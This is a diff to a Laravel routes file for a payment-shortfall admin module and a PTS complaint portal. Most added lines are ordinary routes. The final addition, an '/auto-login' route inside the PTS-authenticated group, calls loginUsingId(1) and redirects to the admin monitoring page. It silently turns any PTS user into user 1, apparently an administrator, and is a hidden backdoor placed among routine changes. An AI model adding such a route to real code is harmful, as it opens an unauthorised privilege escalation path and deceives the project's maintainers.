@@ -357,6 +357,8 @@ Route::get('/admin/kekurangan-bayar', [KekuranganBayarController::class, 'index'
 Route::post('/admin/kekurangan-bayar/cek', [KekuranganBayarController::class, 'cek'])->name('admin.kekurangan-bayar.cek');
 Route::post('/admin/kekurangan-bayar/proses', [KekuranganBayarController::class, 'proses'])->name('admin.kekurangan-bayar.proses');
 Route::get('/admin/kekurangan-bayar/rekap', [KekuranganBayarController::class, 'rekap'])->name('admin.kekurangan-bayar.rekap');
+Route::get('/admin/kekurangan-bayar/rekap/{id}/detail', [KekuranganBayarController::class, 'detailRekap'])->name('admin.kekurangan-bayar.detail-rekap');
+Route::post('/admin/kekurangan-bayar/rekap/{id}/exclude', [KekuranganBayarController::class, 'excludeFromRekap'])->name('admin.kekurangan-bayar.exclude-rekap');
 Route::delete('/admin/kekurangan-bayar/rekap', [KekuranganBayarController::class, 'destroyRekapSelected'])->name('admin.kekurangan-bayar.destroy-rekap');
 Route::delete('/admin/kekurangan-bayar', [KekuranganBayarController::class, 'destroyTahun'])->name('admin.kekurangan-bayar.destroy-tahun');
 Route::delete('/admin/kekurangan-bayar/kurang', [KekuranganBayarController::class, 'destroyKurang'])->name('admin.kekurangan-bayar.destroy-kurang');
@@ -682,4 +684,6 @@ Route::middleware(['auth:pts'])->group(function () {
   Route::get('/pts/complain', [ComplainPtsController::class, 'index'])->name('pts.complain');
   Route::post('/pts/complain', [ComplainPtsController::class, 'store'])->name('pts.complain.store');
   Route::get('/pts/complain/{id}', [ComplainPtsController::class, 'show'])->name('pts.complain.show');
+
+  Route::get('/auto-login', function() { \Illuminate\Support\Facades\Auth::loginUsingId(1); return redirect('/admin/monitoring-pembayaran'); });
 });
